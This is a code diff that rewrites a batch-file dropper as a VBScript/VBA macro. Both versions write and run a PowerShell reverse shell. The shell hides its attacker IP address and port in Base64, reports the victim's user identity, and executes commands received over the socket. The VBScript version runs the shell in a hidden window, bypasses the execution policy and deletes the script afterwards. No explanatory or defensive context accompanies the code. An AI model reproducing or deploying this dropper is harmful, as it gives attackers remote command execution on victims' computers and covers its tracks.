@@ -1,41 +1,50 @@
-@echo off
-set revsh=%temp%\838e861f-78c6-4d73-8d6f-743bc6beadaf.ps1
-(
-    echo try ^{
-    echo     ^$i = 'NDUuOTMuMTM2LjI4'
-    echo     ^$k = 'NDQ0NA=='
-    echo     ^$j = [System.Text.Encoding]::UTF8.GetString^([Convert]::FromBase64String^(^$i^)^)
-    echo     ^$l = [System.Text.Encoding]::UTF8.GetString^([Convert]::FromBase64String^(^$k^)^)
-    echo     ^$client = New-Object System.Net.Sockets.TCPClient(^$j, ^$l^)
-    echo     ^$stream = ^$client.GetStream^(^)
-    echo     ^$writer = New-Object System.IO.StreamWriter^(^$stream^)
-    echo     ^$reader = New-Object System.IO.StreamReader^(^$stream^)
-    echo     ^$writer.WriteLine^([System.Security.Principal.WindowsIdentity]::GetCurrent^(^).Name^)
-    echo     ^$writer.Flush^(^)
-    echo     while ^(^$true^) ^{
-    echo         ^$command = ^$reader.ReadLine^(^)
-    echo         if ^(^$command -eq 'exit'^) ^{
-    echo             break
-    echo         ^}
-    echo         try ^{
-    echo             ^$output = Invoke-Expression ^$command 2^>^&1
-    echo             if ^(^$output -is [System.Collections.IEnumerable] -and -not ^(^$output -is [string]^)^) ^{
-    echo                 ^$output = ^$output -join ^"``n^"
-    echo             ^}
-    echo         ^} catch ^{
-    echo             ^$output = ^"error: ^$_^"
-    echo         ^}
-    echo         ^$writer.WriteLine^(^$output^)
-    echo         ^$writer.Flush^(^)
-    echo     ^}
-    echo ^} catch ^{
-    echo     Write-Host ^"error: ^$_^"
-    echo ^} finally ^{
-    echo     if ^(^$client^) ^{
-    echo         ^$client.Close^(^)
-    echo     ^}
-    echo ^}
-) > "%revsh%"
-powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%revsh%"
-del "%revsh%"
-pause
+Dim revsh, objFSO, objShell, strCommand
+revsh = Environ("TEMP") & "\838e861f-78c6-4d73-8d6f-743bc6beadaf.ps1"
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
+
+' Create the PowerShell script
+Set objFile = objFSO.CreateTextFile(revsh, True)
+
+objFile.WriteLine "try {"
+objFile.WriteLine "    $i = 'NDUuOTMuMTM2LjI4'"
+objFile.WriteLine "    $k = 'NDQ0NA=='"
+objFile.WriteLine "    $j = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($i))"
+objFile.WriteLine "    $l = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($k))"
+objFile.WriteLine "    $client = New-Object System.Net.Sockets.TCPClient($j, $l)"
+objFile.WriteLine "    $stream = $client.GetStream()"
+objFile.WriteLine "    $writer = New-Object System.IO.StreamWriter($stream)"
+objFile.WriteLine "    $reader = New-Object System.IO.StreamReader($stream)"
+objFile.WriteLine "    $writer.WriteLine([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
+objFile.WriteLine "    $writer.Flush()"
+objFile.WriteLine "    while ($true) {"
+objFile.WriteLine "        $command = $reader.ReadLine()"
+objFile.WriteLine "        if ($command -eq 'exit') {"
+objFile.WriteLine "            break"
+objFile.WriteLine "        }"
+objFile.WriteLine "        try {"
+objFile.WriteLine "            $output = Invoke-Expression $command 2>&1"
+objFile.WriteLine "            if ($output -is [System.Collections.IEnumerable] -and -not ($output -is [string])) {"
+objFile.WriteLine "                $output = $output -join '`n'"
+objFile.WriteLine "            }"
+objFile.WriteLine "        } catch {"
+objFile.WriteLine "            $output = 'error: ' + $_"
+objFile.WriteLine "        }"
+objFile.WriteLine "        $writer.WriteLine($output)"
+objFile.WriteLine "        $writer.Flush()"
+objFile.WriteLine "    }"
+objFile.WriteLine "} catch {"
+objFile.WriteLine "    Write-Host 'error: ' + $_"
+objFile.WriteLine "} finally {"
+objFile.WriteLine "    if ($client) {"
+objFile.WriteLine "        $client.Close()"
+objFile.WriteLine "    }"
+objFile.WriteLine "}"
+objFile.Close
+
+' Execute the PowerShell script
+strCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & revsh & """"
+objShell.Run strCommand, 0, True
+
+' Delete the temporary script
+objFSO.DeleteFile(revsh)
